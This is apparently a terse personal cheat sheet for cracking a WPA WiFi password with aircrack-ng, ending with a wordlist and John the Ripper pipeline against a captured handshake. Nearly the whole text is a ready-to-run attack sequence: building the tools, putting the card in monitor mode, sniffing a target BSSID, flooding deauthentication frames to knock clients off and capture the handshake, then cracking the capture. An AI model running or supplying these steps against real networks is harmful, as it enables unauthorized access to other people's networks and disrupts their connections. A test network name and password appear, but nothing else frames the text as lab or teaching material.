https://github.com/danielmiessler/SecLists/raw/master/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt

ssid: UnsuspiciousNetwork
pw: p4ssword


install deps:

$ sudo apt-get install build-essential libssl-dev libnl-3-dev pkg-config libnl-genl-3-dev


install aircrack (or use package manager):

$ wget http://download.aircrack-ng.org/aircrack-ng-1.2-rc4.tar.gz  -O - | tar -xz
$ cd aircrack-ng-1.2-rc4
$ sudo make
$ sudo make install


set up monitor mode

$ sudo airmon-ng check kill
$ sudo airmon-ng start wlan0


start sniffing

$ sudo airodump-ng wlan0mon
$ sudo airodump-ng -c 1 --bssid 00:11:22:33:44:55 -w WPAcrack wlan0mon --ignore-negative-one


deauth

$ sudo aireplay-ng --deauth 100 -a 00:11:22:33:44:55 wlan0mon --ignore-negative-one


turn off monitor mode

$ sudo airmon-ng stop wlan0mon


crack pw

$ aircrack-ng -w wordlist.dic -b 00:11:22:33:44:55 WPAcrack.cap
$ john --session=foo --stdout --incremental | aircrack-ng -w - -b 00:11:22:33:44:55 WPAcrack.cap
$ john --restore=foo | aircrack-ng -w - -b 00:11:22:33:44:55 WPAcrack.cap
